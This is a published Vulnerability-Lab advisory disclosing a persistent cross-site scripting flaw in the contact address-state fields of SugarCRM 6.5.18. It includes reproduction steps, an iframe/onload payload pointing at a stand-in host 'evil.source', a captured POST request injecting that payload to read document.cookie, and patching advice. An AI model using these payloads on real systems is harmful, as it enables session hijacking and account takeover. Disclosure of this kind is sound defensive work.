@@ -1,0 +1,366 @@
+# Exploit Title: SugarCRM 6.5.18 - Persistent Cross-Site Scripting
+# Exploit Author: Vulnerability-Lab
+# Date: 2020-11-16
+# Vendor Homepage: https://www.sugarcrm.com
+# Version: 6.5.18
+
+Document Title:
+===============
+SugarCRM v6.5.18 - (Contacts) Persistent Cross Site Web Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2249
+
+
+Release Date:
+=============
+2020-11-16
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2249
+
+
+Common Vulnerability Scoring System:
+====================================
+5.1
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+2.000€ - 3.000€
+
+
+Product & Service Introduction:
+===============================
+SugarCRM empowers your marketing, sales and services teams to
+collaborate across the entire customer lifecycle for more
+meaningful, memorable experiences. More than 2 million users in 120
+countries have switched to SugarCRM to fuel extraordinary
+customer experiences. We have disrupted the market with a relentless
+pursuit of innovation and visionary solutions,
+bringing the world’s first no-touch, time-aware CX platform. The CX
+suite aggregates the millions of different data points
+on your customers and turns them into proactive truths, trends and
+predictions for you to leverage.
+
+(Copy of the Homepage: https://www.sugarcrm.com )
+
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a persistent
+cross site scripting web vulnerability in the official SugarCRM v6.5.18
+web-application.
+
+
+Affected Product(s):
+====================
+SugarCRM
+Product: SugarCRM v6.5.18 - CRM (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-03: Researcher Notification & Coordination (Security Researcher)
+2020-05-04: Vendor Notification (Security Department)
+2020-05-24: Vendor Notification (Security Department)
+****-**-**: Vendor Response/Feedback (Security Department)
+****-**-**: Vendor Fix/Patch (Service Developer Team)
+****-**-**: Security Acknowledgements (Security Department)
+2020-11-16: Public Disclosure (Vulnerability Laboratory)
+
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted Authentication (Guest Privileges)
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official SugarCRM v6.5.18 web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to
+compromise browser to web-application requests from the application-side.
+
+The persistent cross site web vulnerability is located in the primary
+address state and alternate address state
+input fields of the sales or support module open to create a contacts.
+Remote attackers with low privileged
+sugarcrm accounts are able to inject own malicious script code as
+contact. Higher privileged application user
+accounts will execute the script code on preview of the created contact
+to e.g gain moderator or administrator
+rights via session hijacking, phishing or further persistent
+manipulative web attacks. The code does not only
+execute in the same section were the contact is listed or previewed but
+also after save in the view log function
+context. The attack can thus way be performed via create of a contact or
+via import of a vcf file contact.
+The request method to inject is POST and the attack is limited to
+registered user accounts with default
+contact to the contacts module.
+
+The script code is able to bypass the basic validation process because
+of the primary address state and alternate
+address state are exchanged in the transmit request. Normally in a
+regular transmit the context is parsed securely.
+In the actual case an attacker injects script code in the alternate
+adress when changing the main adress the wrong
+sanitized code occurs in the front-end.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent
+external redirects to malicious source and persistent manipulation of
+affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Sales
+[+] Support
+
+Vulnerable Input(s):
+[+] Primary Address State
+[+] Alternate Address State
+
+Vulnerable Parameter(s):
+[+] primary address state
+[+] alternate address state
+
+Affected Module(s):
+[+] Sales - Contact List
+[+] Support - Contact List
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerability can be exploited by
+remote attackers with low privileged user account and with low user
+interaction.
+For security demonstration or to reproduce the persistent cross site web
+vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the sugarcrm application
+2. Login as low privileged user account
+3. Move to sales or support and click to contact, then open create a new
+contact
+4. Inject payload in the other address and primary adress to the
+alternate address state and primary state input fields
+5. Save the entry and a refresh occurs with the inserted contact details
+Note: The script code execute immediatly after saving in the primary
+adress state and alternate adress state section of both modules
+6. Successful reproduce of the persistent cross site scripting web
+vulnerability!
+
+
+PoC: Payload
+><iframe src=evil.source onload=alert(document.domain)>
+
+
+PoC: Vulnerable Source
+<tr><td scope="col" width="12.5%">
+Primary Address:
+</td>
+<td width="37.5%">
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody><tr>
+<td width="99%">
+<input type="hidden" class="sugar_field" id="primary_address_street"
+value="q">
+<input type="hidden" class="sugar_field" id="primary_address_city"
+value="a">
+<input type="hidden" class="sugar_field" id="primary_address_state"
+value="[MALICIOUS JAVASCRIPT PAYLOAD EXECUTION!]">
+<input type="hidden" class="sugar_field" id="primary_address_country"
+value="y">
+<input type="hidden" class="sugar_field" id="primary_address_postalcode"
+value="p">
+</td><td class="dataField" width="1%">
+</td></tr>
+</tbody></table></td>
+<td scope="col" width="12.5%">
+Other Address:</td>
+<td width="37.5%">
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody><tr><td width="99%">
+<input type="hidden" class="sugar_field" id="alt_address_street" value="n">
+<input type="hidden" class="sugar_field" id="alt_address_city" value="a">
+<input type="hidden" class="sugar_field" id="alt_address_state"
+value=">"[MALICIOUS JAVASCRIPT PAYLOAD EXECUTION!]">
+<input type="hidden" class="sugar_field" id="alt_address_country" value="k">
+<input type="hidden" class="sugar_field" id="alt_address_postalcode"
+value="r">
+</td>
+<td class="dataField" width="1%">
+</td>
+</tr>
+</tbody></table>
+</td>
+</tr>
+
+
+--- PoC Session Logs [POST] ---
+https://sugar-crm.localhost:8000/index.php
+Host: sugar-crm.localhost:8000
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1336
+Origin: https://sugar-crm.localhost:8000
+Authorization: Basic dGVzdGVyMjM6Y2hhb3M2NjYhISE=
+Connection: keep-alive
+Referer: https://sugar-crm.localhost:8000/index.php
+
+Cookie: p7token=677939c76f1b303862ac57ac3592a50e; checkCookie=1;
+PHPWMADMINSESSID=di26ub5h6fegtndktcu4qbkhc1;
+PHPSESSID=t1glh0rluv1cl7h0oh4i1nius4; sugar_user_theme=Sugar5;
+ck_login_id_20=1; ck_login_language_20=en_us;
+EmailGridWidths=0=10&1=10&2=150&3=250&4=175&5=125;
+EmailTreeLayout=42f3ef1b-3d1b-eac3-16a7-5eaeeeaae11c=false&
+713e7381-3309-2845-3c71-5eaeee59f0ca=false&be8b5121-f32c-13fd-cd9c-5eaeeec3b167=false&
+e3e40862-d8f3-77f0-f92e-5eaeee07eb24=false; Meetings_divs=history_v%3D%23
+-
+module=Contacts&record=45ab08a6-6ca8-fd0f-c4cb-5eaef0e0ef02&isDuplicate=false&action=Save&return_module=Contacts&
+return_action=DetailView&return_id=45ab08a6-6ca8-fd0f-c4cb-5eaef0e0ef02&module_tab=&contact_role=&relate_to=Contacts&
+relate_id=45ab08a6-6ca8-fd0f-c4cb5eaef0e0ef02&offset=1&opportunity_id=&case_id=&bug_id=&email_id=&inbound_email_id=&
+salutation=Mr.&first_name=nam23&last_name=e&phone_work=n&title=r&phone_mobile=h&department=t&phone_fax=k&account_name=&
+account_id=&primary_address_street=h&primary_address_city=z&
+primary_address_state=t<iframe src=evil.source
+onload=aler(document.cookie)>&primary_address_postalcode=b&
+primary_address_country=v&alt_address_street=h&alt_address_city=z&alt_address_state=t<iframe
+src=evil.source
+onload=alert(document.cookie)>&alt_address_postalcode=b&alt_address_country=v&alt_checkbox=on&Contacts_email_widget_id=0&
+emailAddressWidget=1&Contacts0emailAddress0=&Contacts0emailAddressId0=&
+Contacts0emailAddressPrimaryFlag=Contacts0emailAddress0&Contacts0emailAddressVerifiedFlag0=true&
+Contacts0emailAddressVerifiedValue0=&useEmailWidget=true&description=v<iframe
+src=a>&report_to_name=&
+reports_to_id=&sync_contact=0,1&lead_source=Web
+Site&do_not_call=0&campaign_name=&campaign_id=&
+assigned_user_name=h%20m&assigned_user_id=1
+-
+POST: HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Location:
+index.php?action=DetailView&module=Contacts&record=45ab08a6-6ca8-fd0f-c4cb-5eaef0e0ef02&offset=1
+Server: Microsoft-IIS/8.5
+Set-Cookie: ck_login_id_20=1; Max-Age=7776000; path=/;
+domain=sugar-crm.localhost:8000
+ck_login_language_20=en_us;  Max-Age=7776000; path=/;
+domain=sugar-crm.localhost:8000
+sugar_user_theme=Sugar5;  Max-Age=31536000
+X-Powered-By: ASP.NET
+Content-Length: 231
+
+
+https://sugar-crm.localhost:8000/index.php?module=Contacts&action=index
+https://sugar-crm.localhost:8000/index.php?module=Audit&action=Popup&query=true&record=45ab08a6-6ca8-fd0f-c4cb-5eaef0e0ef02&module_name=Contacts
+https://sugar-crm.localhost:8000/index.php?module=Import&action=Step1&import_module=Contacts&return_module=Contacts&return_action=index
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched following the next steps ...
+1. Restrict the input fields and disallow special chars for the main
+name values displayed in the list
+2. Escape the input transmitted from the alternate and primary inputs
+3. Parse and sanitize the ouput location to ensure its filtered securely
+
+
+Security Risk:
+==============
+The security risk of the persistent cross site web vulnerability in the
+sugarcrm web-application is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
